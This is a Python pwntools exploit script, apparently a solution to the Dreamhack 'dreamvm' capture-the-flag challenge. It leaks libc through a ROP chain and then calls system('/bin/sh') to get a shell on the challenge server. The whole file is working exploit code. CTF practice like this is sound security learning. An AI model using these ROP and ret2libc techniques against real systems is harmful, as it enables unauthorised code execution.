#!/usr/bin/env python3

from pwn import *

exe = ELF("./dreamvm")

context.binary = exe


def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("host3.dreamhack.games", 12808)

    return r


def main():
    r = conn()

    rop = ROP(exe)
    rdi_gadget = rop.find_gadget(["pop rdi", "ret"])[0]
    rsi_gadget = rop.find_gadget(["pop rsi", "pop r15", "ret"])[0]
    rdx_gadget = rop.find_gadget(["pop rdx", "pop rbx", "pop rbp", "pop r12", "pop r13", "ret"])[0]

    payload = p8(4)
    payload += p64(48)      
    payload += p8(2)
    payload += p8(5)
    payload += p8(4)
    payload += p64(96)
    for i in range(13):
        payload += p8(6)
        payload += p8(1)
    payload += b"A" * (0x100 - len(payload))
    
    rop1 = p64(exe.symbols["main"])         
    rop1 += p64(exe.plt["write"])
    rop1 += p64(0) * 4
    rop1 += p64(8)
    rop1 += p64(rdx_gadget)
    rop1 += p64(0)
    rop1 += p64(exe.got["read"])
    rop1 += p64(rsi_gadget)
    rop1 += p64(1)
    rop1 += p64(rdi_gadget)
    
    r.send(payload + rop1)

    ret_leak = u64(r.recvn(8))
    read_leak = u64(r.recvn(8))

    log.success(f"Leak RET: {hex(ret_leak)}")
    log.success(f"Leak READ GOT: {hex(read_leak)}")

    pause()

    libc = ELF('./libc.so.6')
    libc.address = read_leak - libc.symbols["read"]

    binsh = next(libc.search(b"/bin/sh\x00"))
    system = libc.symbols["system"]

    payload2 = p8(4)
    payload2 += p64(72)      
    for i in range(3):
        payload2 += p8(6)
        payload2 += p8(1)
    payload2 += b"A" * (0x100 - len(payload2))
    
    rop2 = p64(system)
    rop2 += p64(binsh)
    rop2 += p64(rdi_gadget)

    r.send(payload2 + rop2)

    r.interactive()


if __name__ == "__main__":
    main()